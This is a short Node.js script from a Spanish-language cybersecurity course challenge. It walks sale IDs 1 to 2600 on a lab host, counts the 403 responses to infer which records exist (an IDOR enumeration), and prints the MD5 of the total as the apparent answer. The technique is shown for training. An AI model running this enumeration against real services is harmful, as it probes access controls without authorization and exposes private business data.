/**
 * Contador de ventas por enumeracion de IDs (IDOR) - Desafio curso ciberseguridad.
 *
 * 403 Forbidden = la venta existe (no tenes permiso para verla, pero existe).
 * Este script recorre un rango de IDs y cuenta cuantos devuelven 403.
 *
 * Requiere Node.js 18+ (trae fetch nativo, no hace falta instalar nada).
 * Uso: node contador_ventas.js
 */

const crypto = require("crypto");

const BASE_URL = "https://chl-56abfae4-e70f-45c6-9e62-a26d27b8a75c-ventas.softwareseguro.com.ar/ventas/";

const RANGE_START = 1;
const RANGE_END = 2600;   // subi este numero si hace falta seguir barriendo
const DELAY_MS = 10;     // pausa entre requests para no saturar el server
const EXISTS_STATUS = 403; // status que indica "la venta existe"

function sleep(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

async function contarVentas() {
  const statusCounts = {};
  const idsExistentes = [];

  for (let id = RANGE_START; id <= RANGE_END; id++) {
    try {
      const resp = await fetch(`${BASE_URL}?id=${id}`);
      statusCounts[resp.status] = (statusCounts[resp.status] || 0) + 1;

      if (resp.status === EXISTS_STATUS) {
        idsExistentes.push(id);
        console.log(`id=${id} -> ${resp.status} (existe)`);
      } else {
        console.log(`id=${id} -> ${resp.status}`);
      }
    } catch (err) {
      console.log(`id=${id} -> ERROR: ${err.message}`);
    }

    await sleep(DELAY_MS);
  }

  console.log("\n--- Resumen de status codes ---");
  for (const [code, count] of Object.entries(statusCounts).sort()) {
    console.log(`  ${code}: ${count}`);
  }

  const total = idsExistentes.length;
  console.log(`\nCantidad de ventas encontradas (status ${EXISTS_STATUS}): ${total}`);
  console.log(`IDs: ${idsExistentes.join(", ")}`);

  const md5 = crypto.createHash("md5").update(String(total)).digest("hex");
  console.log(`\nMD5(${total}) = ${md5}`);

  return { total, md5 };
}

contarVentas();